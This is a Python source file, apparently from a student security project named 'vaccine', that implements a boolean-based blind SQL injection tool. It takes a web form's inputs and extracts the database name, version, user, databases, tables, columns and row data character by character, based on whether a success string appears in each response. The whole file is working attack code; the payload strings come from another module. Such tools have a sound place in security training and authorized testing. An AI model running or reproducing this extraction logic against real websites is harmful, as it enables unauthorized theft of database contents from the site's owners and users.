# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    blind.py                                           :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: luzog78 <luzog78@gmail.com>                +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2025/12/15 18:52:15 by luzog78           #+#    #+#              #
#    Updated: 2025/12/17 04:39:10 by luzog78          ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

from typing import Any

from exploits import Exploit
from vaccine import Database, Form, DBServer, InputField, Table, print


def blind_exploit(
		headers: dict[str, str],
		server: DBServer,
		ignored_databases: list[str],
		payloads: dict[str, str],
		delimiter: str,
		form: Form,
		input: InputField | None,
		verbose: bool,
		) -> bool:
	inputs = [input] if input is not None else form.inputs
	for _input in inputs:
		exploit = Exploit(
			exploit_name='blind',
			headers=headers,
			server=server,
			ignored_databases=ignored_databases,
			payloads=payloads,
			delimiter=delimiter,
			form=form,
			input=_input,
			verbose=verbose,
		)

		exploit.memory['success_substring'] = payloads['success_substring']
		exploit.memory['chars'] = [chr(i) for i in range(32, 127)]

		result = exploit.do_exploit(
			database_exploit_func=database_blind_exploit,
			version_exploit_func=version_blind_exploit,
			user_exploit_func=user_blind_exploit,
			databases_exploit_func=databases_blind_exploit,
			tables_exploit_func=tables_blind_exploit,
			columns_exploit_func=columns_blind_exploit,
			rows_exploit_func=rows_blind_exploit,
		)
		if result:
			return True
	return False


def __fetch(exploit: Exploit, injection_payload: str, max_len: int, **kwargs: Any) -> str | None:
	string = ''
	chars = exploit.memory['chars']
	success_substring = exploit.memory['success_substring']

	def do_fetch(position: int, char: str) -> str | None:
		response = exploit._fetch(
			injection_payload,
			position=position,
			char=char,
			**kwargs
		)
		if success_substring in response:
			return char
		return None

	res = do_fetch(0, "")
	if res is None:
		return None

	position = 1
	for _ in range(1, max_len + 1):
		res = do_fetch(position, "")
		if res is not None:
			position += 1
			break
		for char in chars:
			res = do_fetch(position, char)
			if res is not None:
				string += char
				break
		else:
			string += 'ï¿½'
		position += 1
	return string if position > 1 else None


def fetch_unique(exploit: Exploit, injection_payload: str, max_len: int, **kwargs: Any) -> str | None:
	injection_payload = exploit.format_payload(injection_payload)
	return __fetch(exploit, injection_payload, max_len=max_len, **kwargs)


def fetch(exploit: Exploit, injection_payload: str, max_len: int, **kwargs: Any) -> tuple[list[str], bool]:
	injection_payload = exploit.format_payload(injection_payload)

	def do_fetch(**kw: Any):
		return __fetch(
			exploit,
			injection_payload,
			max_len=max_len,
			**kw,
			**kwargs,
		)

	res = do_fetch()
	if res is None:
		return [], False

	data = [res]
	if 'offset' not in kwargs:
		total_nb = 1
		while True:
			more_data = do_fetch(limit=1, offset=total_nb)
			if more_data is None:
				break
			total_nb += 1
			data.append(more_data)
	return data, not not data


def database_blind_exploit(exploit: Exploit, payload: str) -> Database | None:
	database_name = fetch_unique(exploit, payload, max_len=64)
	if database_name is None:
		print('    [!] Exploit failed: Cannot retrieve database user')
		return None

	print(f'    [+] Exploit successful: Database name is {repr(database_name)}')
	db = exploit.server.get_db(database_name)
	if db is None:
		db = Database(name=database_name)
		exploit.server.dbs.append(db)
	return db


def version_blind_exploit(exploit: Exploit, payload: str) -> str | None:
	version = fetch_unique(exploit, payload, max_len=128)
	if version is None:
		print('    [!] Exploit failed: Cannot retrieve database version')
		return None

	print(f'    [+] Exploit successful: Database version is {repr(version)}')
	exploit.server.version = version
	return version


def user_blind_exploit(exploit: Exploit, payload: str) -> str | None:
	user = fetch_unique(exploit, payload, max_len=64)
	if user is None:
		print('    [!] Exploit failed: Cannot retrieve database user')
		return None

	print(f'    [+] Exploit successful: Database user is {repr(user)}')
	exploit.server.user = user
	return user


def databases_blind_exploit(exploit: Exploit, payload: str) -> list[Database] | None:
	database_names, success = fetch(exploit, payload, max_len=64)
	if not success:
		print('    [!] Exploit failed: Cannot retrieve database names')
		return None

	print(f'    [+] Exploit successful: Found {len(database_names)} databases: {", ".join([repr(db) for db in database_names])}')
	databases = []
	for database_name in database_names:
		db = exploit.server.get_db(database_name)
		if db is None:
			db = Database(name=database_name)
			exploit.server.dbs.append(db)
		databases.append(db)
	return databases


def tables_blind_exploit(exploit: Exploit, payload: str,
		database: Database) -> list[Table] | None:
	table_names, success = fetch(
		exploit,
		payload,
		max_len=64,
		database=database.name,
	)
	if not success:
		print('      [!] Exploit failed: Cannot retrieve table names')
		return None

	print(f'      [+] Exploit successful: Found {len(table_names)} tables: {", ".join([repr(t) for t in table_names])}')
	tables = []
	for table_name in table_names:
		table = database.get_table(table_name)
		if table is None:
			table = Table(name=table_name)
			database.tables.append(table)
		tables.append(table)
	return tables


def columns_blind_exploit(exploit: Exploit, payload: str,
		database: Database, table: Table) -> list[str] | None:
	columns, success = fetch(
		exploit,
		payload,
		max_len=96,
		database=database.name,
		table=table.name,
	)
	if not success:
		print(f'        [!] Exploit of {repr(table.name)} failed: Cannot retrieve column names')
		return None

	print(f'        [+] Exploit of {repr(table.name)} successful: Found {len(columns)} columns: {", ".join([repr(c) for c in columns])}')
	table.columns = columns
	return columns


def rows_blind_exploit(exploit: Exploit, payload: str, database: Database,
			table: Table, column: str, column_idx: int) -> list[str] | None:
	rows, success = fetch(
		exploit,
		payload,
		max_len=512,
		database=database.name,
		table=table.name,
		column=column,
	)
	if not success:
		print('          [!] Exploit failed: Cannot retrieve rows')
		return None

	print(f'          [+] Exploit successful: Found {len(rows)} rows in {repr(table.name)}.{repr(column)}')

	table_rows_len = len(table.rows)
	table_columns_len = len(table.columns)
	for i, row in enumerate(rows):
		if i < table_rows_len:
			r = table.rows[i]
		else:
			r: list[Any] = [None] * table_columns_len
			table.rows.append(r)
		row_len = len(r)
		if row_len < table_columns_len:
			r.extend([None] * (table_columns_len - row_len))
		r[column_idx] = row
	return rows
